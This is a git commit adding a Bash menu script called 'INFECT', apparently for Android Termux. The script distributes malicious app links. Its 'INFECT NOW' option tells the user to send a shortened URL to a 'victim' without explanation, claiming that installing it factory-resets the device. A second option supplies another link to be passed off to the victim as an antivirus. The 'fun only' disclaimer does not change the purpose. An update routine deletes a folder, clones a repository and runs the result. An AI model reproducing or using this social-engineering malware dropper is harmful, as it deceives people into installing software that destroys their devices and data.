db55865df42c746832417ac3ced027210a69ab12
Exotıc Hrıdoy <92029487+exotic-inx@users.noreply.github.com>
2024-02-02 15:07:40 +0600

    Add files via upload

---
+++ AHMED_XD_S_SECTION/INFECT_dec.sh
@@ -0,0 +1,289 @@
+
+red="\e[91m"
+rset="\e[0m"
+grn="\e[92m"
+ylo="\e[93m"
+blue="\e[94m"
+cyan="\e[96m"
+pink="\e[95m"
+clear
+banner(){
+vid
+echo -e "\e[93m "
+echo "  "
+echo -e "                @      @ "
+echo -e "        / \     { _____}      / \ "
+echo -e "      /  |  \___/*******\___/  |  \ "
+echo -e "     (   I  /   ~   °   ~   \  I   ) "
+echo -e "      \  |  |   0       0   |  |  / "
+echo -e "        \   |       A       |   / "
+echo -e "          \__    _______    __/ "
+echo -e "             \_____________/ "
+echo -e "       _-------*         *-------_ "
+echo -e "      /  /---                ---\  \ "
+echo -e '    /  /     (    INFECT  )      \  \  '
+echo -e '   {  (     (     v1.0.3   )      )  }  '
+echo -e "    \  \    |              |     /  / "
+echo -e "      \  \  |              |   /  / "
+echo -e "       **** |              |  ****"
+echo -e "      //|\\  \______________/  //|\\ "
+echo -e "      *         °*** ***°         * "
+echo -e "     ***.       .*** ***.       .*** "
+echo -e "     °*************° °*************°
+"
+echo " "
+echo -e "$red        ▶CODED BY$grn U7P4L 1N$red◀$rset"
+echo -e "$red        ⫸$ylo ANONYMOUS U7P4L$red ⫷$rset"
+echo
+echo -e "$red     [INFECT THEM WITH FUN]$rset"
+echo " "
+echo " "
+}
+baner1(){
+clear
+echo -e "\e[93m "
+echo "  "
+echo -e "                @      @ "
+echo -e "        / \     { _____}      / \ "
+echo -e "      /  |  \___/*******\___/  |  \ "
+echo -e "     (   I  /   ~   °   ~   \  I   ) "
+echo -e "      \  |  |   0       0   |  |  / "
+echo -e "        \   |       A       |   / "
+echo -e "          \__    _______    __/ "
+echo -e "             \_____________/ "
+echo -e "       _-------*         *-------_ "
+echo -e "      /  /---                ---\  \ "
+echo -e '    /  /     (    INFECT  )      \  \  '
+echo -e '   {  (     (     v1.0.3   )      )  }  '
+echo -e "    \  \    |              |     /  / "
+echo -e "      \  \  |              |   /  / "
+echo -e "       **** |              |  ****"
+echo -e "      //|\\  \______________/  //|\\ "
+echo -e "      *         °*** ***°         * "
+echo -e "     ***.       .*** ***.       .*** "
+echo -e "     °*************° °*************°
+"
+echo " "
+echo -e "$red        ▶CODED BY$grn U7P4L 1N$red◀$rset"
+echo -e "$red        ⫸$ylo ANONYMOUS U7P4L$red ⫷$rset"
+echo
+echo -e "$red     [INFECT THEM WITH FUN]$rset"
+echo " "
+echo " "
+}
+menu(){
+echo -e "$grn  ＞＞＞＞>>>＞$ylo [OPTIONS]$grn ＜<<<＜＜＜＜$rset"
+echo " "
+echo " "
+echo -e "$red         ➡$cyan [\e[92m1\e[96m] INFECT NOW"
+echo -e "$red         ➡$cyan [\e[92m2\e[96m] SAVE NOW"
+echo -e "$red         ➡$cyan [\e[92m3\e[96m] ABOUT"
+echo -e "$red         ➡$cyan [\e[92m4\e[96m] UPDATE SCRIPT"
+echo -e "$red         ➡$cyan [\e[92m5\e[96m] SUBSCRIBE"
+echo -e "$red         ➡$cyan [\e[92m6\e[96m] MORE"
+echo -e "$red         ➡$cyan [\e[92m7\e[96m] COMMUNITY"
+echo -e "$red         ➡$cyan [\e[92m8\e[96m] EXIT"
+echo " "
+echo " "
+echo -e "$grn    >＞＞＞＞＞$ylo [SELECT]$grn ＜＜＜＜＜<$rset"
+echo " "
+echo -ne "\e[92m  SELECT OPTION\e[92m: "
+read optnz
+if [ $optnz = "1" ];
+then
+virus
+elif [ $optnz = "2" ];
+then
+save
+elif [ $optnz = "3" ];
+then
+about
+elif [ $optnz = "4" ];
+then
+upd
+elif [ $optnz = "5" ];
+then
+am start -a android.intent.action.VIEW -d https://t.me/TheU7p4lArmyX > /dev/null 2>&1
+banner
+menu
+elif [ $optnz = "6" ];
+then
+am start -a android.intent.action.VIEW -d https://github.com/U7P4L-IN > /dev/null 2>&1
+banner
+menu
+elif [ $optnz = "7" ];
+then
+am start -a android.intent.action.VIEW -d https://t.me/TheU7p4lArmyX > /dev/null 2>&1
+banner
+menu
+elif [ $optnz = "8" ];
+then
+exit 1
+else
+echo "wrong"
+exit
+fi
+}
+virus(){
+clear
+echo
+echo " "
+echo -e "\e[96m
+──▐─▌──▐─▌──
+─▐▌─▐▌▐▌─▐▌─
+─█▄▀▄██▄▀▄█─
+──▄──██▌─▄──
+▄▀─█▀██▀█─▀▄
+▐▌▐▌─▐▌─▐▌▐▌
+─▐─█────█─▌─
+────▌──▐────
+\e[91m ��  Copy below link and send it your victim and
+say nothing to him. when he install it in his
+device it will be factory reset and lot more happens.
+👇👇👇
+\e[92mL1NK :- \e[96mhttps://tinyurl.com/uppdatesnew\e[91m
+👆👆👆
+Use only for fun purpose not for harming someone 😇✌️.
+And our channel is not responsible for any kind of loss
+you do to other's by this script."
+echo
+echo -ne "\e[92m#Type exit : "
+read exitz
+if [ $exitz = "exit" ];
+then
+banner
+menu
+else
+banner
+menu
+fi
+}
+save(){
+clear
+echo
+echo " "
+echo " "
+echo -e "\e[93m  Copy below link and send it your victim and tell him
+that he should install this application or else his
+device will not be recovered.(Antivirus)
+👇👇👇
+\e[92mL1NK :- \e[96mhttps://bit.ly/3fX8ljZ\e[93m
+👆👆👆
+Use only for fun purpose not for harming someone 😇✌️.
+And our channel is not responsible for any kind of
+loss you do to other's by this script."
+echo
+echo -ne "\e[92m#Type exit : "
+read exitz
+if [ $exitz = "exit" ];
+then
+banner
+menu
+else
+banner
+menu
+fi
+}
+about(){
+clear
+echo -e '\e[91m
+──▐─▌──▐─▌──
+─▐▌─▐▌▐▌─▐▌─
+─█▄▀▄██▄▀▄█─
+──▄──██▌─▄──
+▄▀─█▀██▀█─▀▄
+▐▌▐▌─▐▌─▐▌▐▌
+─▐─█────█─▌─
+────▌──▐────
+'
+echo -e "\e[93m                  CALL ME \e[92mU7P4L" | pv -qL 10
+echo -e "\e[93m          IAM FROM \e[92ANONYMOUS U7P4L" | pv -qL 10
+echo -e "\e[93m       I'M A \e[92mHACKER\e[93m WITH LOTS OF EXCITEMENT" | pv -qL 10
+echo -e "\e[93m          HOPE YOU LIKE THIS SCRIPT" | pv -qL 10
+echo -e "\e[93m       OOPS... I TALK A LOT SRY FOR THAT " | pv -qL 10
+echo -e "\e[93m          JOIN GROUPS ON \e[92mWHATS' APP" | pv -qL 10
+echo -e "\e[93m     MY GITHUB :\e[92m https://github.com/U7P4L-IN\e[0m" | pv -qL 10
+echo -e "\e[92m           BYEE.............." | pv -qL 10
+sleep 6.0
+banner
+menu
+}
+upd(){
+if [ -d "$HOME/INFECT" ];
+then
+cd $HOME
+rm -rf INFECT
+elif [ -d "$HOME/INFECT" ];
+then
+cd $HOME
+rm -rf INFECT
+else
+echo
+exit 1
+fi
+cd $HOME
+sleep 1
+echo -e "     \e[96mUPDATE IS GOING ON, PLEASE WAIT FOR A WHILE...!\e[0m"
+echo
+printf "                     \e[96m["
+while git clone https://github.com/U7P4L-IN/INFECT 2> /dev/null; do
+printf  "\e[92m▓▓▓▓▓▓▓▓▓▓▓▓▓\e[0m"
+sleep 1
+done
+printf "\e[96m]\e[0m"
+echo
+echo
+echo
+printf "\e[96m   UPDATE SUCCESSFULL (LATEST VERSION)..!\e[0m"
+sleep 2.0
+cd $HOME
+cd INFECT
+bash INFECT.sh
+}
+vid(){
+FILE=$HOME/INFECT/noob.noob
+if [ -f "$FILE" ]; then
+pop
+else
+echo
+fi
+}
+pop(){
+clear
+echo -e "\e[96m     ╔═══════════════════════════════════╗\e[0m"
+echo -e "\e[96m     ║  \e[93mHAI, I JUST UPLOADED NEW\e[96m VIDEO   ║\e[0m"
+echo -e "\e[96m     ║      WATCH NEW VIDEO NOW.....!    ║\e[0m"
+echo -e "\e[96m     ║                                   ║\e[0m"
+echo -e "\e[96m     ║        Select \e[92my\e[96m to watch\e[96m          ║\e[0m"
+echo -e "\e[96m     ║                (\e[93mOR\e[96m)               \e[96m║\e[0m"
+echo -e "\e[96m     ║        Select \e[91mt\e[96m to cancel\e[96m         ║\e[0m"
+echo -e "\e[96m     ║                (\e[93mOR\e[96m)               \e[96m║\e[0m"
+echo -e "\e[96m     ║     Select \e[91mz\e[96m to skipforever\e[96m       ║\e[0m"
+echo -e "\e[96m     ╚═══════════════════════════════════╝\e[0m"
+echo -en "\e[32mSELECT OPTION [\e[93my/\e[93mt/\e[32m\e[93mz\e[32m]: \e[0m "
+read p
+if [ "$p" = "y" ];
+then
+am start -a android.intent.action.VIEW -d https://noobhacktube.com 2>/dev/null
+clear
+baner1
+menu
+elif [ "$p" = "t" ];
+then
+clear
+baner1
+menu
+elif [ "$p" = "z" ];
+then
+cd $HOM/INFECT
+rm noob.noob
+banner
+menu
+else
+banner
+menu
+exit
+fi
+}
+banner
+menu
